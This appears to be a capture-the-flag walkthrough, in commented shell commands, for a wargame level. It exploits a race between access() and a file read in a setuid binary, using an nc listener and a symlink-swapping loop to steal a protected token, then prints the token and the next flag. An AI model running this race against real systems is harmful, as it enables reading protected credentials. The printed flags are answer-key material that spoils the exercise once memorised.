# again, we decompile the executable in the directory
# it appears to try to open a socket to a host, and send a file
# it checks that its true ID is allowed to read the file using access
# however 'access' has a common exploit: changing the nature of the target file between the 
# access check and the file read

# we open three tabs

# one to serve as the host
# listen to port 6969 for any connection (and keep doing it)
nc -lk 6969

# one to alternate the nature of the target file
# switch between a link to the token file and a dummy file
while true ;
    do echo "failed" > /tmp/test;
    rm /tmp/test;
    ln -s $HOME/token /tmp/test;
    rm /tmp/test;
done

# and one to keep trying to read the token file

while true ; do
    ./level10 /tmp/test 127.0.0.1;
done

# after a few loops, we get

#.*( )*.
#woupa2yuojeeaaed06riuj63c

# escalate power level
su flag10
woupa2yuojeeaaed06riuj63c
# get next flag
getflag # > feulo4b72j7edeahuete3no7c